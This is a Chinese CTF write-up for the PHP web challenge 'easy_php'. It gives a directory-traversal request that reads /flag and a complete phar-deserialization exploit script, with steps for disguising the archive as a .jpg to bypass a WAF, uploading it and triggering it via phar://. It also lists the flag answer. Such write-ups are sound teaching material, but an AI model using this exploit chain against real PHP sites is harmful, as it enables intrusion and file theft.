# easy_php

> 分类：Web

## 题目描述

PHP 反序列化 / phar 反序列化题。源码中有 `file.php` 可读取文件，且 `show` 函数有过滤但未过滤 `/flag`。

## 考察知识点

- phar 反序列化
- 文件包含（目录遍历）
- 原题复现

## 解法

**解法一（非预期）：目录遍历读 flag**

`file.php` 的 show 函数虽然有过滤，但没有过滤 `/flag`，直接读取：

```
/file.php?file=/flag
```

**解法二（预期解）：phar 反序列化**

找到一道几乎一样的原题（类名 `C1e4r` 换成 `Chunqiu`，flag 位置改到根目录）。构造 phar：

```php
<?php
class Chunqiu { public $test; public $str; }
class Show { public $source; public $str; }
class Test {
    public $file; public $params;
    public function __construct() { $this->params = array('source'=>'/flag'); }
}
$c = new Chunqiu();
$s = new Show();
$t = new Test();
$s->source = $s;
$s->str['str'] = $t;
$c->str = $s;
echo serialize($c);
$phar = new Phar("exp.phar");
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata($c);
$phar->addFromString("exp.txt", "test");
$phar->stopBuffering();
?>
```

将 `exp.phar` 后缀改成 jpg 绕过 waf，在 `/upload_file.php` 上传，然后在 `/file.php` 使用 phar 协议读取触发反序列化。

## 参考答案

`flag{a16dcb7549915546893a27a6d7927615}`

## 来源

- 作者：Liebert77 | https://blog.csdn.net/2301_80185313/article/details/145268362
- 作者：frank1q22 | https://xz.aliyun.com/news/17083
- 作者：H轨迹H | https://www.cnblogs.com/GuijiH6/p/18680901
